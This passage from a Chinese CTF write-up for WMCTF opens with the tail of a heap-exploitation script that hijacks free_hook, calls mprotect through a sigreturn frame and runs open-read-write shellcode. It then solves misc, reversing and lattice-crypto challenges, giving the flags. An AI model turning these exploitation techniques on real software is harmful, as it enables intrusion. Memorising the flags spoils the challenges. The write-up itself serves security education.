class="string"></span></span><br><span class="line"><span class="string">mov rdi, 0 ;// error_code</span></span><br><span class="line"><span class="string">mov rax, 60</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload1  = p64(libc_base1 + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span>) + p64(free_hook1 + <span class="number">0x10</span>) + asm(shellcode1)</span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x30</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = free_hook1 + <span class="number">8</span></span><br><span class="line">frame.rip = libc_base1 + libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>] <span class="comment"># 0xa8 rcx</span></span><br><span class="line">frame.rdi = free_hook1 &amp;<span class="number">0xFFFFFFFFFFFFF000</span></span><br><span class="line">frame.rsi = <span class="number">0x1000</span></span><br><span class="line">frame.rdx = <span class="number">4</span> | <span class="number">2</span> | <span class="number">1</span></span><br><span class="line">payload1 += <span class="built_in">str</span>(frame)[<span class="number">0x30</span>:<span class="number">0xD8</span>]</span><br><span class="line"></span><br><span class="line">payload2  = p64(libc_base2 + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span>) + p64(free_hook2 + <span class="number">0x10</span>) + asm(shellcode2)</span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x30</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = free_hook2 + <span class="number">8</span></span><br><span class="line">frame.rip = libc_base2 + libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>] <span class="comment"># 0xa8 rcx</span></span><br><span class="line">frame.rdi = free_hook2 &amp;<span class="number">0xFFFFFFFFFFFFF000</span></span><br><span class="line">frame.rsi = <span class="number">0x1000</span></span><br><span class="line">frame.rdx = <span class="number">4</span> | <span class="number">2</span> | <span class="number">1</span></span><br><span class="line">payload2 += <span class="built_in">str</span>(frame)[<span class="number">0x30</span>:<span class="number">0xD8</span>]</span><br><span class="line">add_free(<span class="number">0xF0</span>,payload1,payload2)</span><br><span class="line">p.sendline(asm(orw))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2><span id="misc">Misc</span><a href="#misc" class="header-anchor"></a></h2><h3><span id="dalabengba">Dalabengba</span><a href="#dalabengba" class="header-anchor"></a></h3><p>先用EnigmaVBUnpacker.exe将游戏解包<br><img src="https://hackmd.summershrimp.com/uploads/upload_f40cca716ad4cccb72861350a9b79c3e.png"><br>然后开启rpgmaker开一个新项目，把www里面文件拷过去打开<br><img src="https://hackmd.summershrimp.com/uploads/upload_b3e744e636152849dc783d0ff598e507.png"><br>在这个网站把素材解包<a href="https://petschko.org/tools/mv_decrypter/%EF%BC%8C%E6%8A%8A%E5%AE%8C%E6%95%B4%E7%9A%84%E6%94%BE%E5%9B%9E%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8C%EF%BC%8C%E8%BF%99%E9%87%8C%E8%A6%81%E4%BF%AE%E6%94%B9data/system.json%E7%9A%84%E9%85%8D%E7%BD%AE">https://petschko.org/tools/mv_decrypter/，把完整的放回文件夹里，这里要修改data/system.json的配置</a><br>“hasEncryptedImages”: false,<br>“hasEncryptedAudio”: false,<br>运行正常使用了<br><img src="https://hackmd.summershrimp.com/uploads/upload_0280daf918a26ff67cafd0d76c9745e5.png"><br>查找了国王最后成功的话<br><img src="https://hackmd.summershrimp.com/uploads/upload_5db1d582c9cd1710e90fd9de5e605019.png"><br>调试发现还是加密了，用了decText.js里面代码<br>参考<a href="http://cache.baiducontent.com/c?m=9d78d513d98303fa4fece4215e4f80260e55f0744cd2c7647dc3923884155f563662f4cb51356704c7823c390ef50f1aa8b12173441e3df2de8d9f4aaae3c97b73c97d73671cf1104f8c04edd64727c621900cb8f81cb3eea6&p=c96fc64ad48c11a058e8d6654948&newp=92769a47cd8911a058e8872b445c92695c02dc3051ddd001298ffe0cc4241a1a1a3aecbb24241502d9c478610abb0f31aba7747d605f76acd1&s=cfcd208495d565ef&user=baidu&fm=sc&query=RPGMAKER%EF%BF%BD%EF%BF%BD%EF%BF%BD%C6%BD%EF%BF%BD&qid=f601feaf00042d52&p1=1">RPGMaker防破解百度快照</a><br>去分析rpg_core.js，推出systemkey:”f74592328a168cf858e727078d4f6ab”，然后丢回包里看国王说的话，其实可以把所有发现加密的都跑出来看看有哪些东西<br><img src="https://images-cdn.shimo.im/V0etRC2WJpTzNdys__thumbnail.PNG"><br>emm好像没flag<br>第一部分：</p>
<p>直接跳到最后的天空城关卡<br><img src="https://hackmd.summershrimp.com/uploads/upload_44b8b47e88c65b64871b31003e28c45e.png"><br>发现移动路线组成单词Pr1nCe5s<br>第二部分：<br>文件part2.jpg<br>前面有一个do you know java ，查了java和图片隐写的东西<br>找打java盲水印工具：<a href="https://github.com/ww23/BlindWatermark%EF%BC%8C">https://github.com/ww23/BlindWatermark，</a><br>需要拼接一部分，扫描出第二部分<br><img src="https://hackmd.summershrimp.com/uploads/upload_66fa2c8058debf0be49712ab229dc1ad.png"><br>W@rR1or</p>
<p>第三部分：<br>前面导入systemkey后使用加密的素材<br><img src="https://hackmd.summershrimp.com/uploads/upload_36ef3f2933fd61a8f638cbfa7bb0197a.png"><br>看到国王的话逆序hex-&gt;ascii得到Y0u_@re_5o_bRaVE得到一个文件<br><img src="https://hackmd.summershrimp.com/uploads/upload_238ca188ca474387ad33958b4cbff3be.png"><br>搜文件名s3cr3t找到了个解密的<a href="https://gist.github.com/aanoaa/1408846">https://gist.github.com/aanoaa/1408846</a><br>出了WhrRrrr~<br><img src="https://hackmd.summershrimp.com/uploads/upload_0d910504a7ecb5dfa598b63708415bb9.png"></p>
<h3><span id="xman-happy-birthday">XMAN_Happy_birthday!</span><a href="#xman-happy-birthday" class="header-anchor"></a></h3><p>翻转</p>
<h3><span id="music-game">Music_game</span><a href="#music-game" class="header-anchor"></a></h3><p>声控游戏，走到终点就出flag</p>
<h2><span id="rev">Rev</span><a href="#rev" class="header-anchor"></a></h2><h3><span id="wmware">Wmware</span><a href="#wmware" class="header-anchor"></a></h3><p><strong>Second Blood</strong></p>
<p>一个bochs,磁盘文件,010打开后看到了熟悉的0x55AA,拖入ida,选择16位.扇区是512字节为一个单位,这样可以找到一些代码,简单分析了一下发现是在输入,循环等待不停等待端口状态变化,然后读入,这里获得的是键盘的扫描码,转成了ascii,写到了显存的地址</p>
<p>用bochs自带的调试器调一下,在输入的时候中断,输入的跳出条件是读到回车的扫描码,继续调试,结合ida,发现他在进行一个6*6的循环,每次拿出来一个扫描码.加0x55后放到另外一个地方,有点像栅栏密码,后面切换模式到32位,运行保护模式的代码,这里可以开一个32位的ida,直接F5,发现循环xor了几个很臭的常数,选择臭常数的条件是循环的次数取余9,全部都是xor,写逆运算计算回来就行了</p>
<h3><span id="welcome-to-ctf">Welcome to CTF</span><a href="#welcome-to-ctf" class="header-anchor"></a></h3><p>一个windows逆向,一开始踩坑到了虚假的执行流,虚假的base64,虚假的xor,在init的时候,运行了好多函数,关于异常反调试等等,还有三处调用了ntdll里面的一个可以对抗调试器的函数.</p>
<p>既然这样,那就直接上trace了,手头有一个写好的工具,配合qemu,trace出了他所有的指令流<br><img src="https://hackmd.summershrimp.com/uploads/upload_eb1e6150524146d82f47f963b35c4a87.png"><br>发现到这里了,跟进去看了一下,和假的那个函数差不多,直接逆了一下,发现有一个改了表的base64函数,后面是几个明显的大数计算,这里直接patch了他的ntdll那个函数的调用,可以调试了,在进入虚假的check函数时,修改eip到这个函数,手动跳过来,继续调试</p>
<p>整理出来大概的流程:<br>base64decode -&gt; rsa -&gt; 高60bit和低56bit分别做x y,计算x^3 + y^3 + z^3 &#x3D; 43<br>这里的一个常数值是立方和&#x3D;42的解,这里却还是43,先带进去42的结果生成一下flag,然后跑trace.<br>算了一下发现是错的,继续边trace边打印内存,发现base64的结果就不对了,但是log里还是有那个函数的痕迹的,继续查log,发现在初始化码表后,decode之前,有一个函数跳走了.那就是这里的问题了,读了一下码表,发现和直接dump出来的不一样,修了一下码表,最后又一次trace,发现已经输出GOOD了,估计那个43最后还是被改过,不过已经出了就没继续trace了.</p>
<h3><span id="easy-re">easy_re</span><a href="#easy-re" class="header-anchor"></a></h3><p><strong>Second Blood</strong></p>
<p>调试得到perl源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$flag = &quot;WMCTF&#123;I_WAnt_dynam1c_F1ag&#125;&quot;</span><br><span class="line">print &quot;please input the flag:&quot;;</span><br><span class="line">$line = &lt;STDIN&gt;;</span><br><span class="line">chomp($line);</span><br><span class="line">if($line eq $flag)&#123;</span><br><span class="line">print &quot;congratulation!&quot;</span><br><span class="line">&#125;else&#123;&#x27;</span><br><span class="line">print &quot;no,wrong&quot;&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3><span id="meet-in-july">Meet_in_July</span><a href="#meet-in-july" class="header-anchor"></a></h3><p><strong>First Blood</strong></p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_adfc7becae87af10ef6798f13fe703ee.png"><br>check格式flag{}长度70<br>数字和大写ABCDEF<br><img src="https://hackmd.summershrimp.com/uploads/upload_933b2c51cb597137690981f9004ce0d5.png"><br>字符串转16进制后进sub_401909进行加密<br><img src="https://hackmd.summershrimp.com/uploads/upload_b0b0102d285e2209705ad6e60fcbf3dd.png"><br>主要是乘法减法mod三个操作</p>
<p>因为sub_401111操作结果都是32bytes，猜测是一个取模操作。</p>
<p>用了两组数据算出了模数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> GCD</span><br><span class="line"></span><br><span class="line">inp_1 = <span class="number">0x1790fc4efe2923a51ea676027908f3670d509bd2db7d6f45e38f6dc0258697415aaff6dd5ca9006aead7b3ea053c115aabd618bcdea5ca109dab2555e8e62a566a06666b81753587d2c92fab5e0254d62320a508222420415b0cc681cdda98</span></span><br><span class="line">out_1 = bytes_to_long(<span class="built_in">bytes</span>([</span><br><span class="line">    <span class="number">0xF4</span>, <span class="number">0x56</span>, <span class="number">0x29</span>, <span class="number">0xCE</span>, <span class="number">0xB3</span>, <span class="number">0x4D</span>, <span class="number">0x25</span>, <span class="number">0xBD</span>, <span class="number">0xD4</span>, <span class="number">0xC2</span>,</span><br><span class="line">    <span class="number">0xED</span>, <span class="number">0xDA</span>, <span class="number">0x01</span>, <span class="number">0xB2</span>, <span class="number">0x67</span>, <span class="number">0xDF</span>, <span class="number">0x8E</span>, <span class="number">0xBB</span>, <span class="number">0x5F</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x1F</span>, <span class="number">0x6D</span>, <span class="number">0x5A</span>, <span class="number">0x2F</span>, <span class="number">0x3D</span>, <span class="number">0x85</span>, <span class="number">0xE8</span>, <span class="number">0xF3</span>, <span class="number">0x8F</span>, <span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0xB3</span>, <span class="number">0x6F</span>][::-<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">inp_2 = bytes_to_long(<span class="built_in">bytes</span>([<span class="number">0x11</span>]*<span class="number">33</span>))</span><br><span class="line">out_2 = bytes_to_long(<span class="built_in">bytes</span>([</span><br><span class="line">    <span class="number">0xAC</span>, <span class="number">0xF4</span>, <span class="number">0x0D</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>,</span><br><span class="line">    <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0xC1</span>, <span class="number">0x8E</span>, <span class="number">0x01</span>, <span class="number">0x11</span>, <span class="number">0x11</span>,</span><br><span class="line">    <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>,</span><br><span class="line">    <span class="number">0x11</span>, <span class="number">0x11</span>][::-<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">d_1 = inp_1 - out_1</span><br><span class="line">d_2 = inp_2 - out_2</span><br><span class="line">n = GCD(d_1, d_2)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(n))</span><br><span class="line"><span class="comment"># 0x1000000000000000000000000000000e98c3c3c3c3c3c3c3c3c3c3c3c3c3c6b15</span></span><br></pre></td></tr></table></figure>


<p>逻辑如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">输入flag&#123;1234567812345678123456781234567812345678123456781234567812345678&#125;</span><br><span class="line"></span><br><span class="line">0xE98C3C3C3C3C3C3C3C3C3C3C3C3C3C6B15</span><br><span class="line"></span><br><span class="line">0x1234567812345678123456781234567812345678123456781234567812345678</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input*input</span><br><span class="line">0x14b66dc208ba5f83fcbe5145f0c24307e4c634c9d8ca268bccce184dc0d20a0f8b69204d97652e8ba3613cc9af5d4b07bb595945c7556783d35175c1df4d840</span><br><span class="line">-2</span><br><span class="line">0x14b66dc208ba5f83fcbe5145f0c24307e4c634c9d8ca268bccce184dc0d20a0f8b69204d97652e8ba3613cc9af5d4b07bb595945c7556783d35175c1df4d83e</span><br><span class="line">0x14b66dc208ba5f83fcbe5145f0c24307e4c634c9d8ca268bccce184dc0d20a0f8b69204d97652e8ba3613cc9af5d4b07bb595945c7556783d35175c1df4d83e*0x1234567812345678123456781234567812345678123456781234567812345678</span><br><span class="line">0x1790fc4efe2923a51ea676027908f3670d509bd2db7d6f45e38f6dc0258697415aaff6dd5ca9006aead7b3ea053c115aabd618bcdea5ca109dab2555e8e62a689e5cde7db5cbad9a071fa7bd9258cce857771d1a567a98538f633e94023110</span><br><span class="line">-0x1234567812345678123456781234567812345678123456781234567812345678</span><br><span class="line">0x1790fc4efe2923a51ea676027908f3670d509bd2db7d6f45e38f6dc0258697415aaff6dd5ca9006aead7b3ea053c115aabd618bcdea5ca109dab2555e8e62a566a06666b81753587d2c92fab5e0254d62320a508222420415b0cc681cdda98</span><br><span class="line">mod</span><br><span class="line">0xF4, 0x56, 0x29, 0xCE, 0xB3, 0x4D, 0x25, 0xBD, 0xD4, 0xC2, </span><br><span class="line">  0xED, 0xDA, 0x01, 0xB2, 0x67, 0xDF, 0x8E, 0xBB, 0x5F, 0x00, </span><br><span class="line">  0x1F, 0x6D, 0x5A, 0x2F, 0x3D, 0x85, 0xE8, 0xF3, 0x8F, 0x45, </span><br><span class="line">  0xB3, 0x6F</span><br><span class="line">这是mod1</span><br><span class="line"></span><br><span class="line">0x14b66dc208ba5f83fcbe5145f0c24307e4c634c9d8ca268bccce184dc0d20a0f8b69204d97652e8ba3613cc9af5d4b07bb595945c7556783d35175c1df4d83e</span><br><span class="line"></span><br><span class="line">mod1*input</span><br><span class="line">0x60, 0xBA, 0x26, 0x58, 0x6D, 0x56, 0xC2, 0xF6, 0xBA, 0x2C, </span><br><span class="line">  0x2C, 0xFE, 0x23, 0x6D, 0x59, 0xD6, 0xBD, 0x02, 0xF6, 0x50, </span><br><span class="line">  0x08, 0x62, 0x54, 0x3C, 0xA9, 0x5E, 0xD7, 0x0B, 0xAD, 0x3A, </span><br><span class="line">  0xA2, 0xE1, 0x55, 0xF1, 0x6C, 0x91, 0x48, 0x55, 0xD1, 0xF2, </span><br><span class="line">  0xFA, 0x7E, 0x67, 0xEB, 0x91, 0x3E, 0x3A, 0x13, 0xF8, 0xA8, </span><br><span class="line">  0x9D, 0x98, 0xAD, 0x49, 0x3F, 0xAD, 0x0C, 0x4D, 0xBC, 0xDD, </span><br><span class="line">  0x08, 0x71, 0xF1, 0x07</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  mod1*input-0x14b66dc208ba5f83fcbe5145f0c24307e4c634c9d8ca268bccce184dc0d20a0f8b69204d97652e8ba3613cc9af5d4b07bb595945c7556783d35175c1df4d83e</span><br><span class="line">  0x22, 0xE2, 0x31, 0x3A, 0x11, 0x3F, 0x8D, 0xB9, 0x42, 0xD6, </span><br><span class="line">  0xB6, 0xA1, 0x8F, 0xD7, 0xA3, 0x5A, 0x0D, 0x2E, 0x00, 0xB6, </span><br><span class="line">  0x3B, 0x4E, 0x1E, 0x82, 0xC0, 0x0B, 0x61, 0x32, 0xA8, 0xA8, </span><br><span class="line">  0xEB, 0xE8, 0xB4, 0xD0, 0x5F, 0xB5, 0xC3, 0x73, 0x04, 0x36, </span><br><span class="line">  0x92, 0xDC, 0xDA, 0x4D, 0x45, 0xDB, 0xED, 0x94, 0xC7, 0x84, </span><br><span class="line">  0x91, 0x39, 0x99, 0x64, 0x73, 0x6D, 0x14, 0xA7, 0x30, 0xBD, </span><br><span class="line">  0x2C, 0x0A, 0xA6, 0x06, 0x00</span><br><span class="line">  和0xE98C3C3C3C3C3C3C3C3C3C3C3C3C3C6B15 + n mod</span><br><span class="line">  mod2</span><br><span class="line">  0x9C, 0x23, 0x26, 0x35, 0x7B, 0xB2, 0x09, 0xE8, 0xA0, 0xAC, </span><br><span class="line">  0x2D, 0x99, 0x7B, 0x0A, 0x8C, 0x99, 0xF6, 0x7C, 0x5F, 0xCB, </span><br><span class="line">  0x15, 0x6E, 0x54, 0xBA, 0xBF, 0x36, 0x3E, 0xC4, 0x50, 0xDB, </span><br><span class="line">  0xE6, 0x61</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  mod2*mod1</span><br><span class="line">  0xB0, 0x58, 0x4C, 0xB4, 0x20, 0x87, 0xA0, 0x19, 0x9D, 0xF5, </span><br><span class="line">  0x83, 0x1D, 0x83, 0x0F, 0xC3, 0xB8, 0x6B, 0x3D, 0x56, 0x42, </span><br><span class="line">  0xCF, 0xA7, 0xE8, 0x3E, 0xD1, 0xA5, 0xF3, 0xCE, 0x06, 0x6D, </span><br><span class="line">  0x45, 0x88, 0x7A, 0x85, 0xE1, 0x3C, 0x58, 0xA2, 0xBC, 0x11, </span><br><span class="line">  0x86, 0xF0, 0x1A, 0x7C, 0x4A, 0x5A, 0x41, 0xB7, 0x18, 0x9A, </span><br><span class="line">  0x0B, 0x09, 0xCB, 0x3C, 0xE4, 0x8E, 0x98, 0x86, 0xE8, 0xA4, </span><br><span class="line">  0x1D, 0xA8, 0xB7, 0x2A, 0x00</span><br><span class="line">  </span><br><span class="line">  mod2*mod1-input</span><br><span class="line">  0x38, 0x02, 0x18, 0xA2, 0xA8, 0x30, 0x6C, 0x07, 0x25, 0x9F, </span><br><span class="line">  0x4F, 0x0B, 0x0B, 0xB9, 0x8E, 0xA6, 0xF3, 0xE6, 0x21, 0x30, </span><br><span class="line">  0x57, 0x51, 0xB4, 0x2C, 0x59, 0x4F, 0xBF, 0xBC, 0x8E, 0x16, </span><br><span class="line">  0x11, 0x76, 0x7A, 0x85, 0xE1, 0x3C, 0x58, 0xA2, 0xBC, 0x11, </span><br><span class="line">  0x86, 0xF0, 0x1A, 0x7C, 0x4A, 0x5A, 0x41, 0xB7, 0x18, 0x9A, </span><br><span class="line">  0x0B, 0x09, 0xCB, 0x3C, 0xE4, 0x8E, 0x98, 0x86, 0xE8, 0xA4, </span><br><span class="line">  0x1D, 0xA8, 0xB7, 0x2A</span><br><span class="line">  mod2*mod1-input和0xE98C3C3C3C3C3C3C3C3C3C3C3C3C3C6B15 + n mod</span><br><span class="line">  0x84, 0x89, 0x81, 0xDB, 0x91, 0x0B, 0x73, 0x5D, 0xAE, 0xE3, </span><br><span class="line">  0xC3, 0x37, 0x30, 0x51, 0x21, 0x52, 0xD5, 0x1B, 0x83, 0xD4, </span><br><span class="line">  0x37, 0x45, 0x8C, 0xA4, 0xF6, 0xBA, 0x76, 0xC3, 0xAF, 0xE3, </span><br><span class="line">  0xDD, 0xE2</span><br><span class="line">  </span><br><span class="line">  mod3</span><br><span class="line">  </span><br><span class="line">  mod3结果和</span><br><span class="line">  0x45, 0x84, 0x2F, 0x86, 0x44, 0x61, 0x1A, 0xDE, 0x59, 0x37, </span><br><span class="line">  0xD6, 0xD7, 0xC2, 0x8D, 0x6A, 0x67, 0xB1, 0x35, 0xB9, 0x53, </span><br><span class="line">  0xC7, 0xCF, 0xEF, 0xBD, 0xD5, 0x35, 0x85, 0x7D, 0x79, 0x04, </span><br><span class="line">  0x47, 0x23</span><br><span class="line">  比较  </span><br></pre></td></tr></table></figure>

<p>总结为：<br>$$<br>\begin{aligned}<br>y &amp;\equiv x^2 - 2 \<br>z &amp;\equiv y \cdot x - x \equiv x^3 - 3x \pmod{n} \<br>a &amp;\equiv z \cdot x - y \equiv (x^3 - 3x )x - (x^2 - 2) \equiv x^4 - 4x^2 + 2  \pmod{n}       \<br>b &amp;\equiv a \cdot z - x \equiv  (x^4-4x^2 + 2) (x^3 - 3x)<br>-x \equiv x^7 -7x^5 + 14x^3 - 7x \pmod{n}<br>\end{aligned}<br>$$</p>
<p>试了一下，模数n可以被分解为两个素数：</p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_aa549cd4b2fea446ef3cede72d45f0ca.png"></p>
<p>p &#x3D; 320265757102059730318470218759311257989<br>q &#x3D; 361550014853497117429835520396253724753</p>
<p>通过Mathematica可以分别在mod p和mod q上解出来x</p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_8cdadd80b40e712d8885735244da2871.png"></p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_4e390411a80f80ec29f9859d80ff4d67.png"></p>
<p>然后再用CRT即可得到在mod n下的解：17608204545242378720348793798058123425575979093234353645947732994798163637792</p>
<p>程序输入flag{26EDE3FE048B6BFA04F647259A3F00505FD9C9CCB87298CD631FD91F17CCB620}</p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_f4ea85e2037390a2008bdb99f9973dd6.png"></p>
<p>提交需要将”flag”改成”WMCTF”</p>
<h3><span id="easy-apk">easy_apk</span><a href="#easy-apk" class="header-anchor"></a></h3><p>一个安卓逆向,字符串都被加密了,看了一下调用了native的check函数,在ida里看了一下check函数,判断长度是不是32,然后取出偶数位,使用AES加密,然后用加密的结果,作为祖冲之算法的密钥加密全部的flag.<br>后来改题了AES生成的那个祖冲之算法的key,是已知的了,然后因为那个是流加密,所以直接把加密后的flag带回去就拿到flag了.</p>
<h2><span id="crypto">Crypto</span><a href="#crypto" class="header-anchor"></a></h2><h3><span id="babysum">babySum</span><a href="#babysum" class="header-anchor"></a></h3><p>Random BKZ Blocksize 24</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> load</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">sol, A</span>):</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x, a <span class="keyword">in</span> <span class="built_in">zip</span>(sol, A):</span><br><span class="line">        s += x*a</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">k, n, d = <span class="number">20</span>, <span class="number">120</span>, <span class="number">0.8</span></span><br><span class="line">s, A = load(<span class="built_in">open</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;r&quot;</span>))</span><br><span class="line"></span><br><span class="line">N = <span class="number">50</span></span><br><span class="line">BS = <span class="number">24</span></span><br><span class="line"></span><br><span class="line">lat = []</span><br><span class="line"><span class="keyword">for</span> i, a <span class="keyword">in</span> <span class="built_in">enumerate</span>(A):</span><br><span class="line">    lat.append([<span class="number">1</span>*(j == i) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)] + [N*a] + [N])</span><br><span class="line">lat.append([<span class="number">0</span>]*n + [N*s] + [k*N])</span><br><span class="line"></span><br><span class="line">itr = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    itr += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(itr)</span><br><span class="line">    nums = lat[::]</span><br><span class="line">    shuffle(nums)</span><br><span class="line">    m = matrix(ZZ, nums)</span><br><span class="line">    ml = m.BKZ(block_size=BS)</span><br><span class="line">    <span class="keyword">for</span> i, row <span class="keyword">in</span> <span class="built_in">enumerate</span>(ml):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (-<span class="number">1</span> &lt;= <span class="built_in">min</span>(row[:-<span class="number">1</span>]) <span class="keyword">and</span> <span class="built_in">max</span>(row[:-<span class="number">1</span>]) &lt;= <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(row)):</span><br><span class="line">            <span class="keyword">if</span> row[i] &lt; <span class="number">0</span>:</span><br><span class="line">                row[i] *= -<span class="number">1</span></span><br><span class="line">        temp_bool = (check(row, A) == s)</span><br><span class="line">        <span class="keyword">if</span> temp_bool == <span class="literal">True</span>:</span><br><span class="line">            <span class="built_in">print</span>(i, row)</span><br><span class="line">            quit()</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.summershrimp.com/uploads/upload_faf549fca1bd7700eaead38dfb8281f4.png"></p>
<h3><span id="piece-of-cake">piece_of_cake</span><a href="#piece-of-cake" class="header-anchor"></a></h3><p>二维格可以用高斯格基规约，多试几组数据就可以跑出来了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 